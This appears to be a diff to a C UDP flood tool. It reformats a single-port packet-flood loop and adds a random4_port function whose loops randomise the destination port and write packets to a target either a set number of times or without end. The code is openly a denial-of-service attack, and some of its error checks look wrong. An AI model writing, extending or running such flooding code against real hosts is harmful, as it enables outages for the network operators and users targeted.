@@ -74,15 +74,15 @@ static void single4_port(void)
 		INFOEE("Udp4 socket can't be connected");
 
 	// if we have a specific number of packets
-	for(uint64_t i=0; i<packets; i++) {
+	for (uint64_t i = 0; i < packets; i++) {
 		n = write(connection->sock, connection->buff, connection->bufflen);
 		if (!n)
 			break;
 	}
-	
+
 	// if we already send the packets end it.
-	if(packets>0) goto ret;
-	
+	if (packets > 0) goto ret;
+
 	// it means that we have infinite packets.
 	for (;;) {
 		n = write(connection->sock, connection->buff, connection->bufflen);
@@ -93,9 +93,35 @@ static void single4_port(void)
 ret:
 	return;
 }
+
 static void random4_port(void)
 {
+	ssize_t n;
+
 	DEBUG("Udp4 flood attack is starting using random ports");
+	// if we have a specific number of packets
+	for (uint64_t i = 0; i < packets; i++) {
+		((struct sockaddr_in*)connection->addr)->sin_port = port_random();
+		if (!connect(connection->sock, (SA *)&connection->addr, sizeof(connection->addr)))
+			INFOEE("Udp4 socket can't be connected");
+		n = write(connection->sock, connection->buff, connection->bufflen);
+		if (!n)
+			break;
+	}
+
+	if (packets > 0) goto ret;
+
+	for (;;) {
+		((struct sockaddr_in*)connection->addr)->sin_port = port_random();
+		if (!connect(connection->sock, (SA *)&connection->addr, sizeof(connection->addr)))
+			INFOEE("Udp4 socket can't be connected");
+		n = write(connection->sock, connection->buff, connection->bufflen);
+		if (!n)
+			break;
+	}
+
+ret:
+	return;
 }
 
 static void range4_port(void)
